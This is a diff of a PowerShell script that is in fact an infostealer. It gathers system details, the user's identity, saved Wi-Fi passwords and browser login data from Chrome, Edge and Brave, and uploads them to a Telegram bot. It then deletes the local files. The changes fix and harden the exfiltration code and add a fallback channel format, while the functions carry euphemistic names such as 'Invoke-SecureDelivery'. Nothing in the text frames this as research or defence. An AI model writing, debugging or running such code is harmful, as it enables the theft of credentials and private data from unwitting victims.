@@ -36,26 +36,34 @@ function Get-NetworkLocationData {
 
 # Function to get detailed system information
 function Get-SystemSpecifications {
-    $computerInfo = Get-ComputerInfo
-    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
-    $biosInfo = Get-WmiObject -Class Win32_BIOS
-    $processorInfo = Get-WmiObject -Class Win32_Processor
-    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
-    
-    return @{
-        ComputerName = $env:COMPUTERNAME
-        UserName = $env:USERNAME
-        OSName = $osInfo.Caption
-        OSVersion = $osInfo.Version
-        OSBuild = $osInfo.BuildNumber
-        BIOSSerial = $biosInfo.SerialNumber
-        Processor = $processorInfo.Name
-        ProcessorCores = $processorInfo.NumberOfCores
-        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
-        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
-        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
-        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
-        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+    try {
+        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
+        $biosInfo = Get-WmiObject -Class Win32_BIOS
+        $processorInfo = Get-WmiObject -Class Win32_Processor
+        $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
+        
+        return @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            OSName = $osInfo.Caption
+            OSVersion = $osInfo.Version
+            OSBuild = $osInfo.BuildNumber
+            BIOSSerial = $biosInfo.SerialNumber
+            Processor = $processorInfo.Name
+            ProcessorCores = $processorInfo.NumberOfCores
+            TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
+            SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
+            SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
+            LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+            MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+        }
+    } catch {
+        Write-Host "System specs collection error: $($_.Exception.Message)" -ForegroundColor Red
+        return @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            Error = $_.Exception.Message
+        }
     }
 }
 
@@ -73,7 +81,7 @@ function Get-UserProfileData {
             Domain = $env:USERDOMAIN
         }
 
-        # Try to get email from registry (common locations)
+        # Try to get email from registry
         try {
             $mailClients = @(
                 "HKCU:\Software\Microsoft\IdentityCRL",
@@ -94,16 +102,6 @@ function Get-UserProfileData {
             }
         } catch {
             $userInfo.Email = "Not detected"
-        }
-
-        # Get profile picture path
-        try {
-            $picturePath = Join-Path $userPath "Pictures"
-            if (Test-Path $picturePath) {
-                $userInfo.ProfilePicturesPath = $picturePath
-            }
-        } catch {
-            $userInfo.ProfilePicturesPath = "Not accessible"
         }
 
         $userInfo.ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -145,7 +143,7 @@ function Get-WirelessNetworkData {
                     }
                 }
                 
-                # Replace null coalescing operator with compatible syntax
+                # Replace null coalescing with compatible syntax
                 $keyContent = if ($profileDetails["Key Content"]) { $profileDetails["Key Content"] } else { "No security key" }
                 $authentication = if ($profileDetails["Authentication"]) { $profileDetails["Authentication"] } else { "Unknown" }
                 $encryption = if ($profileDetails["Cipher"]) { $profileDetails["Cipher"] } else { "Unknown" }
@@ -244,7 +242,35 @@ function Get-RemoteConnectionData {
     }
 }
 
-# Secure communication function
+# Secure message function - FIXED
+function Send-SecureNotification {
+    param([string]$MessageText)
+    
+    try {
+        $endpoint = "https://api.telegram.org/bot$CommToken/sendMessage"
+        $payload = @{
+            chat_id = $CommChannel
+            text = $MessageText
+            parse_mode = "HTML"
+        }
+        
+        $jsonPayload = $payload | ConvertTo-Json
+        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $jsonPayload -ContentType "application/json"
+        
+        if ($response.ok) {
+            Write-Host "Notification sent" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "Notification issue: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "Notification error: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Secure communication function - FIXED
 function Invoke-SecureDelivery {
     param(
         [string]$ContentPath,
@@ -257,8 +283,8 @@ function Invoke-SecureDelivery {
             return $false
         }
         
-        # Ensure file is fully written
-        $maxWait = 30
+        # Wait for file to be fully written
+        $maxWait = 10
         $waitTime = 0
         while ($waitTime -lt $maxWait) {
             try {
@@ -270,35 +296,37 @@ function Invoke-SecureDelivery {
             Start-Sleep -Seconds 1
             $waitTime++
         }
-        
-        $fileBytes = [System.IO.File]::ReadAllBytes($ContentPath)
-        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
-        $delimiter = [System.Guid]::NewGuid().ToString()
-        $lineBreak = "`r`n"
-        
-        $payload = (
-            "--$delimiter",
-            "Content-Disposition: form-data; name=`"channel_id`"",
-            "",
-            $CommChannel,
-            "--$delimiter",
-            "Content-Disposition: form-data; name=`"description`"",
-            "",
-            $Description,
-            "--$delimiter",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $ContentPath -Leaf)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            $fileContent,
-            "--$delimiter--"
-        ) -join $lineBreak
 
         $endpoint = "https://api.telegram.org/bot$CommToken/sendDocument"
         
-        $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=$delimiter" -Body $payload
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileBytes = [System.IO.File]::ReadAllBytes($ContentPath)
+        $fileName = Split-Path $ContentPath -Leaf
+        
+        $LF = "`r`n"
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            $CommChannel,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "",
+            $Description,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream",
+            "",
+            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            "--$boundary--"
+        ) -join $LF
+
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
+        
+        $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
         
         if ($response.ok) {
-            Write-Host "Content delivered successfully: $(Split-Path $ContentPath -Leaf)" -ForegroundColor Green
+            Write-Host "Content delivered successfully: $fileName" -ForegroundColor Green
             return $true
         } else {
             Write-Host "Delivery issue: $($response.description)" -ForegroundColor Red
@@ -306,33 +334,6 @@ function Invoke-SecureDelivery {
         }
     } catch {
         Write-Host "Secure delivery error: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-# Secure message function
-function Send-SecureNotification {
-    param([string]$MessageText)
-    
-    try {
-        $endpoint = "https://api.telegram.org/bot$CommToken/sendMessage"
-        $payload = @{
-            channel_id = $CommChannel
-            text = $MessageText
-            parse_mode = "HTML"
-        }
-        
-        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $payload -ContentType "application/json"
-        
-        if ($response.ok) {
-            Write-Host "Notification sent" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "Notification issue: $($response.description)" -ForegroundColor Red
-            return $false
-        }
-    } catch {
-        Write-Host "Notification error: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -365,12 +366,6 @@ function Get-BrowserStorageData {
         [string]$BrowserDataPath,
         [string]$BrowserName
     )
-    
-    $browserConfig = @{
-        "Chrome" = @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
-        "Edge" = @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
-        "Brave" = @{ Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
-    }
     
     $loginDataFiles = @()
     $results = @()
@@ -561,10 +556,31 @@ Write-Host "JSON files created successfully" -ForegroundColor Green
 
 # Wait for files to be written
 Write-Host "Finalizing file preparation..." -ForegroundColor Yellow
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 3
 
-# Send initial notification
-$initialMessage = @"
+# Test Telegram connection first
+Write-Host "Testing Telegram connection..." -ForegroundColor Yellow
+$testResult = Send-SecureNotification -MessageText "🖥️ System Data Collection Started - Connection Test"
+
+if (-not $testResult) {
+    Write-Host "Telegram connection failed. Trying alternative channel format..." -ForegroundColor Yellow
+    # Try with -100 prefix
+    $originalChannel = $CommChannel
+    $CommChannel = "-100$CommChannel"
+    $testResult = Send-SecureNotification -MessageText "🖥️ System Data Collection Started - Alternative Format Test"
+    
+    if (-not $testResult) {
+        Write-Host "All Telegram delivery attempts failed. Files saved locally." -ForegroundColor Red
+        Write-Host "Browser Data: $browserDataPath" -ForegroundColor Cyan
+        Write-Host "System Data: $systemDataPath" -ForegroundColor Cyan
+    } else {
+        Write-Host "Alternative channel format works! Using: $CommChannel" -ForegroundColor Green
+    }
+}
+
+if ($testResult) {
+    # Send initial notification
+    $initialMessage = @"
 🖥️ <b>System Data Collection Started</b>
 • <b>Computer:</b> $($systemSpecs.ComputerName)
 • <b>User:</b> $($systemSpecs.UserName)
@@ -573,17 +589,17 @@ $initialMessage = @"
 • <b>Time:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
 
-Send-SecureNotification -MessageText $initialMessage | Out-Null
+    Send-SecureNotification -MessageText $initialMessage | Out-Null
 
-# Send files
-$browserDescription = "🌐 Browser Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
-$systemDescription = "🖥️ System Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
+    # Send files
+    $browserDescription = "🌐 Browser Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
+    $systemDescription = "🖥️ System Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
 
-$browserSent = Invoke-SecureDelivery -ContentPath $browserDataPath -Description $browserDescription
-$systemSent = Invoke-SecureDelivery -ContentPath $systemDataPath -Description $systemDescription
+    $browserSent = Invoke-SecureDelivery -ContentPath $browserDataPath -Description $browserDescription
+    $systemSent = Invoke-SecureDelivery -ContentPath $systemDataPath -Description $systemDescription
 
-# Send completion notification
-$completionMessage = @"
+    # Send completion notification
+    $completionMessage = @"
 ✅ <b>Data Collection Completed</b>
 
 📊 <b>Summary:</b>
@@ -597,7 +613,8 @@ $completionMessage = @"
 ⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
 
-Send-SecureNotification -MessageText $completionMessage | Out-Null
+    Send-SecureNotification -MessageText $completionMessage | Out-Null
+}
 
 # Cleanup
 Write-Host "Performing cleanup..." -ForegroundColor Yellow
@@ -605,9 +622,13 @@ Get-ChildItem -Path "." -Filter "temp_*" -ErrorAction SilentlyContinue | Remove-
 Get-ChildItem -Path "." -Filter "*.db" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path "." -Filter "*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 
-# Remove JSON files after sending
-if (Test-Path $browserDataPath) { Remove-Item $browserDataPath -Force -ErrorAction SilentlyContinue }
-if (Test-Path $systemDataPath) { Remove-Item $systemDataPath -Force -ErrorAction SilentlyContinue }
+# Remove JSON files after sending if successful
+if ($testResult) {
+    if (Test-Path $browserDataPath) { Remove-Item $browserDataPath -Force -ErrorAction SilentlyContinue }
+    if (Test-Path $systemDataPath) { Remove-Item $systemDataPath -Force -ErrorAction SilentlyContinue }
+} else {
+    Write-Host "Files preserved locally due to delivery failure" -ForegroundColor Yellow
+}
 
 Write-Host "Cleanup completed" -ForegroundColor Green
 Write-Host "`nData collection and transmission finished successfully" -ForegroundColor Green
